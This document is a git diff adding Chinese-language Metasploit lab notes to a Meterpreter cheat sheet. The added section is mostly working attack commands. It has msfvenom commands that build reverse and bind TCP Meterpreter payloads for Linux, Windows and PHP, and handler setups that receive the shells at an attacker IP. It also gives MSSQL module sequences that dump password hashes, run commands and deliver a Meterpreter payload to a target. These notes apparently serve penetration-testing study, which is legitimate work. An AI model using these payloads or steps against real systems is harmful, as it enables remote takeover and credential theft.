@@ -55,7 +55,7 @@ peinjector
 powershell
 priv
 python
-sniffer       
+sniffer
 stdapi
 unhook
 winpmem
@@ -73,7 +73,7 @@ upload <file> <destination>
 ```
 download <file> <path to save>
  \\可以下载远程主机上的文件,
- 
+
  如果我们需要递归下载整个目录包括子目录和文件，我们可以使用download -r命令
 ```
 ### 文件执行
@@ -449,13 +449,131 @@ timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
 ```
 
 
+---
+
+## MSF 实验笔记
+
+### Payload
+
+#### Stager中几种常见的payload
+```
+windows/meterpreter/bind_tcp       #正向连接
+windows/meterpreter/reverse_tcp    #反向连接，常用
+windows/meterpreter/reverse_http   #通过监听80端口反向连接
+windows/meterpreter/reverse_https  #通过监听443端口反向连接
+```
+
+### reverse_tcp  
+> 基于TCP的反向链接shell。
+
+  1. linux
+       1.  CLI下生成payload
+       ```shell
+      msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.91.129 lport=4444  -f elf -o shell.elf
+      ```
+      2. 或者在MSF下生成一个shell
+        ```         use payload/linux/x86/meterpreter/reverse_tcp 设置Option
+         set lhost 自己ip
+         set lport 自己端口
+         generate -f elf -o /shell.elf     # -o出文件到指定目录
+        ```
+      3. 在目标靶机上执行文件
+        ```
+        chmod 777 shell.elf
+        ./shell.elf
+        ```
+      4. msf下开启`handler`监听.
+        ```
+        msf  >  use exploit/multi/handler
+        msf  >  set payload linux/x86/meterpreter/reverse_tcp #设置的payload要和生成的相同
+        msf  >  set LHOST 自己IP
+        msf  >  run
+        ```
+        ![](img/1.png)
+
+  2. windos
+     1. CLI下生成payload
+        ```
+        msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe -o 要生成的文件名
+
+       msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.91.129 port=4444 -f exe -o shell.exe
+        ```
+    2. 设置msf
+       ```
+        msf  >  use exploit/multi/handler
+        msf  >  set payload windows/meterpreter/reverse_tcp #设置的payload要和生成的相同
+        msf  >  set LHOST 自己IP
+        msf  >  run
+
+        执行以下shell命令在一个Meterpreter会话界面中使用cmd shell：
+        shell
+        whoami
+       ```
+        ![](img/2.png)
+
+  3. [PHP](https://www.fujieace.com/kali-linux/meterpreter-reverse_tcp-handler.html)
+      ```
+      msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.91.129 LPORT=4444 -f raw > shell.php
+
+        msf  >  use exploit/multi/handler
+        msf  >  set payload php/meterpreter_reverse_tcp  #设置的payload要和生成的相同
+        msf  >  set LHOST 自己IP
+        msf  >  run
+      ```
+      ![](img/3.png)
+
+### bind_tcp
+  1. linux
+  > 这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。
+    ```
+    msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444  -f elf -o shell.elf    设置目标自己打开的端口
+
+    MSF:
+    use exploit/multi/handler
+    set payload linux/x86/meterpreter/bind_tcp #设置的payload要和生成的相同
+    set rhost 目标IP
+    set lport 目标链接端口
+    exploit
+    ```
 
 
 
 
+### 数据库
+
+对应不同数据库写不同shell
+#### Mssql
+
+**查找/捕获服务器的口令**
+
+这里，用到的是Metasploit的mssql_hashdump模块。
+```shell
+# 已知目标 mssql密码，获取服务器的密码
+use auxiliary/scanner/mssql/mssql_hashdump
+show options
+set RHOSTS 192.168.91.131
+set PASSWORD 123456
+run
+```
+![](img/4.png)
 
 
+**重新载入xp_cmd功能**
+```
+use auxiliary/admin/mssql/mssql_exec
+show options
+set CMD 'whoami'
+set RHOST 192.168.109.139
+set PASSWORD 123456
+run
+```
+![](img/5.png)
 
 
+use exploit/windows/mssql/mssql_payload
+set RHOST 192.168.23.100 (我们的目标)
+set password Password01 (我们刚刚获取的密码)
+set payload/windows/meterpreter/reverse_tcp(our selected payload)
+exploit
 
 
